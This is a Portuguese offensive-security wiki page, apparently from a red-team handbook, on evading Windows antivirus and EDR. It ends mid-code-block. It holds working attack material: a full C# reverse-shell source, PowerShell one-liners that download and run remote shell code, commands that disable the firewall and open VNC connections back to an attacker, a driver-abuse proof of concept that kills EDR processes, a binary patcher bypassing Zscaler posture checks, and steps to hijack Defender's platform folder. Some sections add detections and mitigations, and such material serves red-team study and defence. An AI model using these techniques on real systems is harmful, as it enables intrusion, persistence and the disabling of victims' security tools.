**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier, criado automaticamente ao baixar arquivos da internet, juntamente com a URL de onde ele foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier de um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante observar que executáveis assinados com um certificado de assinatura **confiável** **não acionarão o SmartScreen**.

Uma maneira muito eficaz de impedir que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de contêiner, como uma ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **que não sejam NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

O [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evadir o Mark-of-the-Web.

Exemplo de uso:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração de como realizar o bypass do SmartScreen empacotando payloads dentro de arquivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. No entanto, ele também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Assim como o AMSI é desabilitado (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em user space retorne imediatamente sem registrar nenhum evento. Isso é feito aplicando um patch na função em memória para que ela retorne imediatamente, desabilitando efetivamente o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

O carregamento de binários C# em memória é conhecido há bastante tempo e ainda é uma ótima maneira de executar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só precisaremos nos preocupar em aplicar um patch no AMSI para todo o processo.

A maioria dos frameworks de C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc etc.) já oferece a capacidade de executar assemblies C# diretamente na memória, mas há diferentes maneiras de fazer isso:

- **Fork\&Run**

Isso envolve **iniciar um novo processo sacrificial**, injetar seu código malicioso de post-exploitation nesse novo processo, executar seu código malicioso e, quando terminar, encerrar o novo processo. Isso tem benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do processo do nosso implante Beacon. Isso significa que, se algo der errado ou for detectado durante nossa ação de post-exploitation, há uma **chance muito maior** de nosso **implante sobreviver.** A desvantagem é que você tem uma **chance maior** de ser detectado por **Detecções Comportamentais**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código malicioso de post-exploitation **no próprio processo**. Dessa forma, você pode evitar criar um novo processo e fazer com que ele seja analisado pelo AV, mas a desvantagem é que, se algo der errado durante a execução do seu payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode sofrer um crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se quiser ler mais sobre o carregamento de C# Assembly, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o InlineExecute-Assembly BOF deles ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Você também pode carregar C# Assemblies **a partir do PowerShell**. Confira o [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o [vídeo do S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Conforme proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens ao fornecer à máquina comprometida acesso **ao ambiente do interpretador instalado no Attacker Controlled SMB share**.

Ao permitir acesso aos binários do interpretador e ao ambiente no SMB share, você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

O repositório indica: o Defender ainda verifica os scripts, mas, utilizando Go, Java, PHP etc., temos **mais flexibilidade para realizar o bypass de assinaturas estáticas**. Testes com reverse shell scripts aleatórios e não ofuscados nessas linguagens foram bem-sucedidos.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o access token ou um produto de segurança, como um EDR ou AV**, reduzindo seus privilégios para que o processo não seja encerrado, mas também não tenha permissões para verificar atividades maliciosas.

Para evitar isso, o Windows poderia **impedir que processos externos** obtivessem handles sobre os tokens dos processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Conforme descrito [nesta publicação de blog](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), é fácil simplesmente implantar o Chrome Remote Desktop no PC da vítima e usá-lo para assumir o controle e manter a persistência:<sup>[[35]](#references)</sup>
1. Faça o download em https://remotedesktop.google.com/, clique em "Set up via SSH" e, em seguida, clique no arquivo MSI do Windows para baixá-lo.
2. Execute o instalador silenciosamente na vítima (é necessário ser administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volte à página do Chrome Remote Desktop e clique em next. O wizard solicitará sua autorização; clique no botão Authorize para continuar.
4. Execute o parâmetro fornecido com alguns ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Observe o parâmetro pin, que permite definir o PIN sem usar a GUI).


## Advanced Evasion

Evasion é um tópico muito complicado. Às vezes, é necessário considerar muitas fontes diferentes de telemetria em um único sistema, portanto é praticamente impossível permanecer completamente indetectável em ambientes maduros.

Cada ambiente enfrentado terá seus próprios pontos fortes e fracos.

Recomendo fortemente que você assista a esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94) para obter uma introdução às técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta também é outra ótima palestra de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Técnicas Antigas**

### **Verificar quais partes o Defender considera maliciosas**

Você pode usar o [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **removerá partes do binário** até **descobrir qual parte o Defender** está considerando maliciosa e a separará para você.\
Outra ferramenta que faz a **mesma coisa é** o [**avred**](https://github.com/dobin/avred), com uma oferta web aberta do serviço em [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Até o Windows10, todas as versões do Windows vinham com um **Telnet server** que podia ser instalado (como administrador) executando:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Faça-o **iniciar** quando o sistema for iniciado e **execute-o** agora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta do telnet** (furtividade) e desabilitar o firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads bin, não o setup)

**NO HOST**: Execute _**winvnc.exe**_ e configure o server:

- Habilite a opção _Disable TrayIcon_
- Defina uma password em _VNC Password_
- Defina uma password em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **UltraVNC.ini** recém-criado para dentro do **victim**

#### **Reverse connection**

O **attacker** deve **executar dentro** de seu **host** o binário `vncviewer.exe -listen 5900`, para ficar **preparado** para capturar uma **VNC connection** reversa. Então, dentro do **victim**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para manter o stealth, você não deve fazer algumas coisas

- Não inicie o `winvnc` se ele já estiver em execução, ou você acionará um [popup](https://i.imgur.com/1SROTTl.png). Verifique se ele está em execução com `tasklist | findstr winvnc`
- Não inicie o `winvnc` sem o `UltraVNC.ini` no mesmo diretório, ou isso fará com que [a janela de configuração](https://i.imgur.com/rfMQWcf.png) seja aberta
- Não execute `winvnc -h` para obter ajuda, ou você acionará um [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **xml payload** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O defender atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro reverse shell em C#

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e execução automáticos:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de obfuscators C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando Python para criar injectors, exemplo:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Outras ferramentas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Mais

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminando AV/EDR a partir do Kernel

Storm-2603 utilizou um pequeno utilitário de console conhecido como **Antivirus Terminator** para desabilitar as proteções do endpoint antes de implantar ransomware. A ferramenta traz seu **próprio driver vulnerável, porém *assinado***, e abusa dele para executar operações privilegiadas no kernel que nem mesmo os serviços AV Protected-Process-Light (PPL) conseguem bloquear.<sup>[[12]](#references)</sup>

Principais pontos
1. **Driver assinado**: o arquivo entregue ao disco é `ServiceMouse.sys`, mas o binário é o driver legitimamente assinado `AToolsKrnl64.sys`, do “System In-Depth Analysis Toolkit” da Antiy Labs. Como o driver possui uma assinatura válida da Microsoft, ele é carregado mesmo quando o Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalação do serviço**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
A primeira linha registra o driver como um **serviço do kernel** e a segunda o inicia, tornando `\\.\ServiceMouse` acessível a partir do user land.
3. **IOCTLs expostos pelo driver**
| Código IOCTL | Capacidade                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Encerrar um processo arbitrário por PID (usado para eliminar serviços do Defender/EDR) |
| `0x990000D0` | Excluir um arquivo arbitrário do disco |
| `0x990001D0` | Descarregar o driver e remover o serviço |

Prova de conceito mínima em C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por que funciona**: o BYOVD ignora completamente as proteções do user mode; o código executado no kernel pode abrir processos *protegidos*, encerrá-los ou adulterar objetos do kernel, independentemente de PPL/PP, ELAM ou outros recursos de hardening.

Detecção / Mitigação
•  Habilite a lista de bloqueio de drivers vulneráveis da Microsoft (`HVCI`, `Smart App Control`) para que o Windows recuse o carregamento de `AToolsKrnl64.sys`.
•  Monitore a criação de novos serviços do *kernel* e gere alertas quando um driver for carregado a partir de um diretório com permissão de escrita para todos ou não estiver presente na allow-list.
•  Monitore handles do user mode para objetos de dispositivo personalizados, seguidos de chamadas suspeitas a `DeviceIoControl`.

### Contornando as Verificações de Posture do Zscaler Client Connector por meio de Patching do Binário no Disco

O **Client Connector** da Zscaler aplica regras de posture do dispositivo localmente e depende do Windows RPC para comunicar os resultados a outros componentes. Duas decisões de design fracas tornam possível um bypass completo:

1. A avaliação de posture ocorre **inteiramente no client-side** (um booleano é enviado ao servidor).
2. Os endpoints RPC internos validam apenas se o executável conectado é **assinado pela Zscaler** (por meio de `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Ao **aplicar patch em quatro binários assinados no disco**, ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original modificada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, portanto toda verificação é considerada em conformidade |
| `ZSAService.exe` | Chamada indireta para `WinVerifyTrust` | Substituída por NOP ⇒ qualquer processo, mesmo não assinado, pode se conectar aos RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituída por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade do tunnel | Desviadas |

Trecho mínimo do patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Após substituir os arquivos originais e reiniciar a service stack:

* **Todas** as verificações de postura exibem **verde/em conformidade**.
* Binaries não assinados ou modificados podem abrir os endpoints RPC de named pipe (por exemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido obtém acesso irrestrito à rede interna definida pelas políticas da Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e simples verificações de assinatura podem ser derrotadas com alguns patches de bytes.

## Abusando de Protected Process Light (PPL) para adulterar AV/EDR com LOLBINs

Protected Process Light (PPL) impõe uma hierarquia de signer/level, de modo que somente processos protegidos com nível igual ou superior possam adulterar uns aos outros. Ofensivamente, se você puder iniciar legitimamente um binary habilitado para PPL e controlar seus argumentos, poderá converter uma funcionalidade benigna (por exemplo, logging) em uma write primitive limitada e baseada em PPL contra diretórios protegidos usados por AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

O que faz um processo ser executado como PPL
- O EXE de destino (e quaisquer DLLs carregadas) deve estar assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando as flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser solicitado um protection level compatível que corresponda ao signer do binary (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signers antimalware, `PROTECTION_LEVEL_WINDOWS` para signers do Windows). Níveis incorretos farão a criação falhar.

Consulte também uma introdução mais ampla a PP/PPL e à proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas de Launcher
- Helper open-source: CreateProcessAsPPL (seleciona o protection level e encaminha os argumentos ao EXE de destino):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Padrão de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` cria um processo filho de forma independente e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre com suporte de PPL.
- O ClipUp não consegue analisar caminhos que contenham espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

8.3 short path helpers
- Listar nomes curtos: `dir /x` em cada diretório pai.
- Derivar o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS` usando um launcher (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho de log do ClipUp para forçar a criação de um arquivo em um diretório de AV protegido (por exemplo, Defender Platform). Use nomes curtos 8.3 se necessário.
3) Se o binário de destino normalmente estiver aberto/bloqueado pelo AV enquanto estiver em execução (por exemplo, MsMpEng.exe), agende a gravação na inicialização, antes que o AV seja iniciado, instalando um serviço de início automático que seja executado de forma confiável mais cedo. Valide a ordem de inicialização com o Process Monitor (boot logging).
4) Na reinicialização, a gravação com suporte de PPL ocorre antes que o AV bloqueie seus binários, corrompendo o arquivo de destino e impedindo a inicialização.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas e restrições
- Você não pode controlar o conteúdo que o ClipUp grava, apenas o local; a primitive é adequada para corrupção, e não para injeção precisa de conteúdo.
- Requer privilégios de administrador local/SYSTEM para instalar/iniciar um serviço e uma janela de reinicialização.
- O timing é crítico: o alvo não pode estar aberto; a execução no boot evita bloqueios de arquivo.

Detecções
- Criação de processos do `ClipUp.exe` com argumentos incomuns, especialmente quando iniciados por launchers não padrão, próximo ao boot.
- Novos serviços configurados para iniciar automaticamente binários suspeitos e que iniciam consistentemente antes do Defender/AV. Investigue a criação/modificação de serviços antes das falhas de inicialização do Defender.
- Monitoramento da integridade de arquivos nos binários/diretórios do Defender/Platform; criações/modificações inesperadas de arquivos por processos com flags de protected-process.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo de níveis PPL por binários que não sejam de AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem ser executados como PPL e sob quais processos pai; bloqueie a invocação do ClipUp fora de contextos legítimos.
- Service hygiene: restrinja a criação/modificação de serviços com inicialização automática e monitore a manipulação da ordem de inicialização.
- Garanta que a proteção contra tampering do Defender e as proteções de early-launch estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 em volumes que hospedam ferramentas de segurança, se isso for compatível com seu ambiente (teste completamente).

## Tampering do Microsoft Defender via Hijack de Symlink da Pasta de Versão do Platform

O Windows Defender escolhe a plataforma a partir da qual é executado enumerando as subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a string de versão lexicograficamente mais alta (por exemplo, `4.18.25070.5-0`) e inicia os processos do serviço do Defender a partir dela (atualizando os caminhos do serviço/registro de acordo). Essa seleção confia nas entradas de diretório, incluindo directory reparse points (symlinks). Um administrador pode explorar isso para redirecionar o Defender para um caminho gravável pelo atacante e obter DLL sideloading ou causar a interrupção do serviço.<sup>[[21]](#references)[[22]](#references)</sup>

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks na pasta Platform)
- Capacidade de reinicializar ou acionar uma nova seleção da plataforma do Defender (reinicialização do serviço no boot)
- Somente ferramentas integradas são necessárias (mklink)

Por que funciona
- O Defender bloqueia gravações em suas próprias pastas, mas sua seleção de plataforma confia nas entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o destino resolve para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta de plataforma atual, por exemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório de versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção do gatilho (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se o MsMpEng.exe (WinDefend) é executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Você deve observar o novo caminho do processo em `C:\TMP\AV\` e a configuração do serviço/registro refletindo esse local.

Opções de post-exploitation
- DLL sideloading/code execution: Solte/substitua DLLs que o Defender carrega de seu diretório de aplicação para executar código nos processos do Defender. Consulte a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Interrupção/negação do serviço: Remova o version-symlink para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender falhe ao iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Note que esta técnica não fornece privilege escalation por si só; ela requer admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams podem mover a evasão em runtime para fora do C2 implant e colocá-la no próprio target module, fazendo hooking da sua Import Address Table (IAT) e roteando APIs selecionadas por meio de código position-independent (PIC) controlado pelo atacante. Isso generaliza a evasão para além da pequena superfície de APIs que muitos kits expõem (por exemplo, CreateProcessA) e estende as mesmas proteções para BOFs e post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Abordagem de alto nível
- Stage um blob PIC junto ao target module usando um reflective loader (prepended ou companion). O PIC deve ser self-contained e position-independent.
- À medida que o host DLL é carregado, percorra seu IMAGE_IMPORT_DESCRIPTOR e faça patch das entradas da IAT para os imports selecionados (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), apontando-as para thin PIC wrappers.
- Cada PIC wrapper executa evasions antes de fazer tail-call para o endereço da API real. As evasions típicas incluem:
- Memory mask/unmask ao redor da chamada (por exemplo, encrypt beacon regions, RWX→RX, alterar nomes/permissões de páginas) e restauração após a chamada.
- Call-stack spoofing: construir uma stack benigna e fazer a transição para a target API para que a análise da call stack resolva para os frames esperados.<sup>[[9]](#references)</sup>
- Para compatibilidade, exporte uma interface para que um Aggressor script (ou equivalente) possa registrar quais APIs devem sofrer hooking para Beacon, BOFs e post-ex DLLs.

Por que usar IAT hooking aqui
- Funciona para qualquer código que use o import submetido a hooking, sem modificar o código da ferramenta nem depender do Beacon para fazer proxy de APIs específicas.
- Abrange post-ex DLLs: fazer hooking de LoadLibrary* permite interceptar carregamentos de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar a mesma masking/stack evasion às suas chamadas de API.
- Restaura o uso confiável de post-ex commands que criam processos contra detecções baseadas em call stack, encapsulando CreateProcessA/W.

Esboço mínimo de IAT hook (pseudocódigo x64 C/C++)
```c
